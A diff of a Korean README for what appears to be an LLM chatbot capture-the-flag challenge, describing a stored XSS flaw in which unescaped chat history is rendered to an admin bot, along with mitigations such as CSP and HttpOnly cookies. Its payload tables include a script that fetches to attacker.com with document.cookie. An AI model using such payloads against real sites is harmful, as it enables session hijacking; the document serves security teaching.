@@ -44,14 +44,30 @@
 | HTML 엔티티 우회   | `&lt;script&gt;alert(1)&lt;/script&gt;`                                   |
 | DOM 조작        | `<script>document.body.innerHTML='hacked'</script>`                       |
 
-## 🕸️ 시스템 구성 및 동작 흐름
-| 단계 | 설명                                                                                    |
-| -- | ------------------------------------------------------------------------------------- |
+### 2. 🕸️ 동작 흐름
+
+| 단계 | 설명 |
+|-----------|------|
 | 1  | 사용자가 메시지를 입력하면 `conversation_history`에 저장됨                                            |
 | 2  | `ctf05_LLM_ask()` 함수가 GPT-3.5-turbo를 호출해 응답 생성                                        |
 | 3  | `ctf05_generate_share_html()` 함수가 대화 내역을 HTML 파일로 변환함. 이때 사용자 입력이 escape되지 않고 그대로 삽입됨 |
 | 4  | `ctf05_admin_bot_visit()` 함수가 관리자의 HTML 열람을 헤드리스 브라우저로 시뮬레이션함                         |
-| 5  | 악의적 JavaScript가 실행되어 `document.cookie`를 통해 쿠키가 탈취됨                                    |
+| 5  | 악의적 JavaScript가 실행되어 `document.cookie`를 통해 쿠키가 탈취됨 |
+
+### 3. 🛡️ 위협 요소 및 대응 방안
+
+| 위협 | 설명 | 대응 |
+|-----------|------|------|
+| 세션 쿠키 탈취         | 관리자 인증 우회 가능     | `HttpOnly`, `Secure` 속성 사용      |
+| 관리자 권한 탈취        | 민감 정보 접근, 시스템 조작 | 사용자 입력 검증 및 출력 인코딩              |
+| JavaScript 임의 실행 | 악성 행위 유도         | CSP(Content Security Policy) 적용 |
+
+### 4. ✅ 보안 권장 사항
+
+* 사용자 입력은 반드시 출력 전 `html.escape()` 처리 또는 Jinja2 autoescape 기능 사용
+* CSP 적용을 통해 인라인 및 외부 스크립트 제한
+* 모든 사용자 입력에 대한 서버 측 필터링 적용
+* `HttpOnly`, `Secure` 쿠키 설정으로 브라우저 접근 차단
 
 <br>
 
@@ -63,25 +79,6 @@
 | `<script>alert(1)</script>`                                      | 관리자 브라우저에서 alert 실행 |
 | `<img src=x onerror=alert('XSS')>`                               | 관리자 브라우저에서 alert 실행 |
 | `<script>fetch('http://attacker.com?'+document.cookie)</script>` | 쿠키 탈취 가능            |
-
-<br>
-
-## 🛡️ 위협 요소 및 대응 방안
-
-| 위협               | 설명               | 대응 방안                           |
-| ---------------- | ---------------- | ------------------------------- |
-| 세션 쿠키 탈취         | 관리자 인증 우회 가능     | `HttpOnly`, `Secure` 속성 사용      |
-| 관리자 권한 탈취        | 민감 정보 접근, 시스템 조작 | 사용자 입력 검증 및 출력 인코딩              |
-| JavaScript 임의 실행 | 악성 행위 유도         | CSP(Content Security Policy) 적용 |
-
-<br>
-
-## ✅ 보안 권장 사항
-
-* 사용자 입력은 반드시 출력 전 `html.escape()` 처리 또는 Jinja2 autoescape 기능 사용
-* CSP 적용을 통해 인라인 및 외부 스크립트 제한
-* 모든 사용자 입력에 대한 서버 측 필터링 적용
-* `HttpOnly`, `Secure` 쿠키 설정으로 브라우저 접근 차단
 
 <br>
 
